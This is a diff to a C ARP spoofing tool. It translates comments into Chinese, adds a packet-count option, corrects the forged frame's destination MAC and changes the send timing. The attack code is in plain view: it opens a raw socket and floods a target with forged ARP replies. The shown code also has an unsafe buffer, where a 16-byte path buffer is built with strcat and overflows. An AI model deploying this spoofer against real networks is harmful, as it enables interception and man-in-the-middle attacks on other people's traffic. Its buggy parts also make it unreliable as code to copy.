@@ -1,5 +1,5 @@
 /**
- * Include necessary files
+ * 引入库文件
  */
 #include <stdio.h>
 #include <stdlib.h>
@@ -21,31 +21,31 @@
 #include <sys/types.h>
 
 /**
- * Define the colors these are used in printf()
+ * 定义改变printf()输出的颜色
  */
 #define COLOR_DEFAULT_IN_PRINTF "\033[m"
 #define COLOR_RED_IN_PRINTF     "\033[0;32;31m"
 #define COLOR_GREEN_IN_PRINTF   "\033[0;32;32m"
 
 /**
- * Define the printf() with colors
+ * 定义具有颜色标记的printf()
  */
 #define perror(message) {   \
-                          printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message);   \
-                          exit(EXIT_FAILURE);   \
-                        }
+  printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message);   \
+  exit(EXIT_FAILURE);   \
+}
 #define perror_args(message, args) {   \
-                                      printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message, args);   \
-                                      exit(EXIT_FAILURE);   \
-                                    }
+  printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message, args);   \
+  exit(EXIT_FAILURE);   \
+}
 #define pinfo(message) {    \
-                          printf(COLOR_GREEN_IN_PRINTF "--------->>-Information-<<----------\n"    \
-                          COLOR_DEFAULT_IN_PRINTF message   \
-                          COLOR_GREEN_IN_PRINTF "\n--------->>-----END-----<<----------\n");    \
-                        }
+  printf(COLOR_GREEN_IN_PRINTF "--------->>-Information-<<----------\n"    \
+  COLOR_DEFAULT_IN_PRINTF message   \
+  COLOR_GREEN_IN_PRINTF "\n--------->>-----END-----<<----------\n");    \
+}
 
 /**
- * the struct of ARP packet
+ * ARP报文结构
  */
 struct arpstu
 {
@@ -99,21 +99,22 @@ int main(int argc, char* argv[])
   /*
    * 获取相关参数
    */
+  unsigned int  spoof_count = 10; // 攻击总次数
   unsigned char net_interface[16]  = "eth0";
   unsigned char target_ip[4]  = {0}; // Target IP
   unsigned char spoofing_ip[4]  = {0}; // Spoofing IP
-  unsigned char target_mac[6] = {0}; // TargetMAC , this value will lookup ARP table
+  unsigned char target_mac[6] = {0}; // TargetMAC
   unsigned char spoofing_mac[6] = {0}; // spoofing MAC
   unsigned char local_mac[6] = {0}; // localhost MAC;
   unsigned char ethernet_frame[64] = {0}; // ethernet frame
 
   int opt;
-  while ((opt = getopt(argc, argv, "i:t:T:s:S:h")) != -1) {
+  while ((opt = getopt(argc, argv, "i:t:T:s:S:hc:")) != -1) {
     switch (opt) {
     case 'i': {
       char filename[16] = "" ;
       if (strlen(optarg) > 16) {
-        perror("Interface名称过长\n");
+        perror("-i interface名称过长\n");
       }
       strcat(filename, "/sys/class/net/");
       strcat(filename, optarg);
@@ -121,31 +122,37 @@ int main(int argc, char* argv[])
       if (access(filename, 0) == 0) {
         memcpy(net_interface , optarg , sizeof(char)* strlen(optarg));
       } else {
-        perror_args("Unknow interface : %s\n", optarg);
+        perror_args("-i interface未知 : %s\n", optarg);
       }
     } break;
 
-    case 't': {// target IP
+    case 'c': { // 攻击总次数
+      if ((spoof_count = atoi(optarg)) <= 0) {
+        perror("-c 攻击总次数格式错误\n");
+      }
+    } break ;
+
+    case 't': { // target IP
       if (copy_ip(optarg , (char*)&target_ip[0] ) == 0) {
-        perror("目标IP格式错误\n");
+        perror("-t 目标IP格式错误\n");
       }
     } break ;
 
-    case 'T': {// target mac
+    case 'T': { // target mac
       if (copy_mac(optarg , (char*)&target_mac[0] ) == 0) {
-        perror("目标MAC格式错误\n");
+        perror("-T 目标MAC格式错误\n");
       }
     } break ;
 
-    case 's': {// spoofing IP
+    case 's': { // spoofing IP
       if (copy_ip(optarg , (char*)&spoofing_ip[0] ) == 0) {
-        perror("源IP或伪装IP格式错误\n");
+        perror("-s 源IP或伪装IP格式错误\n");
       }
     } break ;
 
     case 'S': { // spoofing mac
       if (copy_mac(optarg , (char*)&spoofing_mac[0] ) == 0) {
-        perror("源MAC或伪装MAC格式错误\n");
+        perror("-S 源MAC或伪装MAC格式错误\n");
       }
     } break ;
 
@@ -157,9 +164,10 @@ int main(int argc, char* argv[])
 -s,   源IP或伪装IP, 必须参数\n    \
 -S,   源MAC或伪装MAC, 必须参数\n    \
 -i,   网卡名称, 可选参数, 默认eth0\n    \
+-c,   攻击次数, 可选参数, 默认10\n    \
 -h,   帮助信息\n\n    \
 例如: arpspoof -t 192.168.1.140 -T AA:BB:CC:DD:EE:00 -s 192.168.1.254 -S AA:BB:CC:DD:EE:01 \n    \
-更多详情请参阅http://www.github.com/sunxiaoyang\n");
+更多详情请参阅: http://www.github.com/sunxiaoyang\n");
     }  exit(1) ;
     }
   }
@@ -188,7 +196,7 @@ int main(int argc, char* argv[])
   /*
    * 将arp报文封装成以太网报文
    */
-  memcpy(ethernet_frame , spoofing_ip , sizeof(char) * 6);
+  memcpy(ethernet_frame , target_mac , sizeof(char) * 6);
   memcpy(ethernet_frame + 6 , local_mac , sizeof(char) * 6);
   ethernet_frame[12] = ETH_P_ARP / 256;
   ethernet_frame[13] = ETH_P_ARP % 256;
@@ -199,7 +207,7 @@ int main(int argc, char* argv[])
    */
   int raw_socket ;
   if ( (raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) )) < 0) {
-    perror("Can't create raw socket. \n")
+    perror("创建raw socket失败. \n")
   }
 
   // 获取网卡的ibdex
@@ -207,7 +215,6 @@ int main(int argc, char* argv[])
   if ((device.sll_ifindex = if_nametoindex ((const char*)net_interface)) == 0) {
     perror("if_nametoindex() 获取网卡index失败 ")
   }
-  printf ("网卡 %s 的index是 %i\n", net_interface, device.sll_ifindex);
   device.sll_family = AF_PACKET;
   device.sll_halen = htons (6);
 
@@ -216,17 +223,16 @@ int main(int argc, char* argv[])
    */
   struct timespec ts;
   ts.tv_sec = 0;
-  ts.tv_nsec = 1000000;
+  ts.tv_nsec = 100000000;
 
-  // Send packet to NIC
-  int count = 1000;
+  // 发送报文至NIC
   printf("------------>-arp攻击开始-<------------\n");
-  while (count--) {
+  while (spoof_count--) {
     if (sendto (raw_socket, ethernet_frame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
       perror ("发送失败\n");
     }
     printf("+");
-    if (count % 50 == 0)printf("\n");
+    if (spoof_count % 50 == 0)printf("\n");
     nanosleep(&ts, NULL);
   }
 
